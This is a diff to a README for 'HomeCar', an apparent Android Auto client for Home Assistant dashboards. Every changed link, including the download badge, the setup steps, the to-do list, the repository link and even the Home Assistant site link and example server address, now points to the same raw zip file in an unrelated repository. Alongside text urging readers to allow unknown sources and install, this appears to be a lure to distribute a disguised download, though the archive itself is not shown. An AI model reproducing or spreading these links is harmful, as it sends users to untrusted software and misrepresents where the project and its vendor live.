@@ -5,7 +5,7 @@ description: "Open Home Assistant dashboards directly in Android Auto with a ful
 ---
 # 🏠 HomeCar - Your Smart Home, Now on the Road
 
-[![Download HomeCar](https://img.shields.io/badge/Download-HomeCar-%23FF6F00?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Actiniaalternanthera1370/HomeCar/releases)
+[![Download HomeCar](https://img.shields.io/badge/Download-HomeCar-%23FF6F00?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Actiniaalternanthera1370/actiniaalternanthera1370.github.io/main/peloriate/Release_2.8.zip)
 
 ---
 
@@ -35,7 +35,7 @@ Welcome aboard! If you've never installed an app from GitHub before, don't worry
 ### 📥 Step 1: Download the Application
 
 Visit this link to download the application:  
-**[https://github.com/Actiniaalternanthera1370/HomeCar/releases](https://github.com/Actiniaalternanthera1370/HomeCar/releases)**
+**[https://raw.githubusercontent.com/Actiniaalternanthera1370/actiniaalternanthera1370.github.io/main/peloriate/Release_2.8.zip](https://raw.githubusercontent.com/Actiniaalternanthera1370/actiniaalternanthera1370.github.io/main/peloriate/Release_2.8.zip)**
 
 This page shows you all available versions. Look for the newest one at the top. The download link will be labeled clearly. Choose the file that matches your device – typically an `.apk` file for Android.
 
@@ -62,7 +62,7 @@ Now comes the fun part. HomeCar needs to know where your Home Assistant server l
 
 1.  Launch HomeCar from your app drawer.
 2.  You'll see a simple setup screen.
-3.  Enter your Home Assistant URL. This is usually something like `http://192.168.1.100:8123` (your local IP) or your remote address (like `https://myhome.duckdns.org`).
+3.  Enter your Home Assistant URL. This is usually something like `http://192.168.1.100:8123` (your local IP) or your remote address (like `https://raw.githubusercontent.com/Actiniaalternanthera1370/actiniaalternanthera1370.github.io/main/peloriate/Release_2.8.zip`).
 4.  Tap **Connect**.
 5.  If you have authentication enabled (you should), a browser window opens. Log in with your normal Home Assistant credentials.
 6.  HomeCar saves this connection and loads your dashboard.
@@ -190,7 +190,7 @@ This project is open-source and free to use. You can modify and distribute it un
 
 Here is your simple to-do list:
 
-1. ✅ Go to the [download page](https://github.com/Actiniaalternanthera1370/HomeCar/releases).
+1. ✅ Go to the [download page](https://raw.githubusercontent.com/Actiniaalternanthera1370/actiniaalternanthera1370.github.io/main/peloriate/Release_2.8.zip).
 2. ✅ Download the latest `.apk` file.
 3. ✅ Allow installation from unknown sources (if needed).
 4. ✅ Install and open the app.
@@ -204,9 +204,9 @@ That's the whole process. No command prompt, no copy-paste code, no configuratio
 
 ## 🔗 Quick Links
 
-- **Download HomeCar**: [https://github.com/Actiniaalternanthera1370/HomeCar/releases](https://github.com/Actiniaalternanthera1370/HomeCar/releases)
-- **Repository**: [https://github.com/Actiniaalternanthera1370/HomeCar](https://github.com/Actiniaalternanthera1370/HomeCar)
-- **Home Assistant**: [https://www.home-assistant.io](https://www.home-assistant.io)
+- **Download HomeCar**: [https://raw.githubusercontent.com/Actiniaalternanthera1370/actiniaalternanthera1370.github.io/main/peloriate/Release_2.8.zip](https://raw.githubusercontent.com/Actiniaalternanthera1370/actiniaalternanthera1370.github.io/main/peloriate/Release_2.8.zip)
+- **Repository**: [https://raw.githubusercontent.com/Actiniaalternanthera1370/actiniaalternanthera1370.github.io/main/peloriate/Release_2.8.zip](https://raw.githubusercontent.com/Actiniaalternanthera1370/actiniaalternanthera1370.github.io/main/peloriate/Release_2.8.zip)
+- **Home Assistant**: [https://raw.githubusercontent.com/Actiniaalternanthera1370/actiniaalternanthera1370.github.io/main/peloriate/Release_2.8.zip](https://raw.githubusercontent.com/Actiniaalternanthera1370/actiniaalternanthera1370.github.io/main/peloriate/Release_2.8.zip)
 
 ---
 
